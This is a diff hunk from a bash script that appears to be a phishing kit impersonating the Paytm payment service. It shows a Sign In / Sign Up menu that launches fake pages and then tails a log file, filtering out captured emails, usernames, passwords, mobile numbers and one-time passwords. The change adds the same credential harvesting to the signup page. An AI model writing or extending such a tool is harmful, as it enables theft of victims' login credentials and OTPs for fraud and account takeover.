@@ -457,12 +457,13 @@ banner(){
                 cd $phish/Paytm-Phishing/ && printf "\n"
                 printf "${red}[${white} 1 ${red}]${green} Sign In \n\n" 
                 printf "${red}[${white} 2 ${red}]${green} Sign Up \n\n"                           
-                read -p $'${red}[${green} >>> ${red}]\e[0m${green} Enter Your Choice : \e[0m' option1			  
+                read -p $'\e[1;31m>>>\e[1;92m Enter Your Choice : \e[0m' option1			  
 		if [ $option1 = 1 ] || [ $option1 = 01 ];then			
 			cd paytm/ && main
                         tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"			              	
 		else
-                        cd signup/ && main                            
+                        cd signup/ && main
+			tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
 		fi
 		break;
 			
